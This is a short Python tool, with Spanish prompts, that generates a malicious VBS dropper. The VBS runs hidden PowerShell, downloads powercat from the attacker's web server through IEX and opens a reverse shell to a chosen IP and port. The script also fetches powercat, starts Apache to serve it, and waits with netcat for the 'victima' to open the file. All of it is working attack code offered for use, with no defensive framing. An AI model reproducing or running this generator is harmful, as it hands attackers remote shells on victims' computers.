import subprocess
import os
import time


path = os.getcwd()+ '/payloads/'
powercat = os.getcwd()+ '/powercat.ps1'
apache2 = "/var/www/html/"

def clearScr():
    os.system('clear')



clearScr()

puerto = input("""

Escoja un puerto [ex:4444] 

    >  """)


windows_ip = input("""

Introduzca su IP 
                    
    >  """)

windows_name = input("""

Escriba el nombre del archivo malicioso

    >  """)


clearScr()



inicio = 'objShell.Run \"'


comando = "-c IEX(New-Object System.Net.WebClient).DownloadString(\'http://"+ windows_ip +"/powercat.ps1\');powercat -c "+ windows_ip +" -p "+ puerto +" -e powershell\""


style = input("""

Escriba [hidden] si quiere que el malware se ejecute en segundo plano /OCULTO/
EScriba [minimized] si quiere que el malware se ejecute en una pestaña minimizada /MINIMIZADO/
        
    >  """)


texto = "Set objShell = CreateObject(\"Wscript.Shell\")\n"\
        ""+ inicio +"powershell -noexit -windowstyle "+ style +" "+ comando +"\n"\


with open(""+ path +""+ windows_name +".vbs","w") as f:
    f.write(texto)

clearScr()

print("Cargando servicios ...")

os.system('wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
os.system('service apache2 start')
clearScr()
os.system('mv '+ powercat +' '+ apache2 +'')


print("El archivo .vbs se ha guardado en el directorio de trabajo msfxenon")
time.sleep(3)
print("\n A la escucha, esperando que la victima abra el archivo .vbs")

os.system('nc -lvp '+ puerto +'')



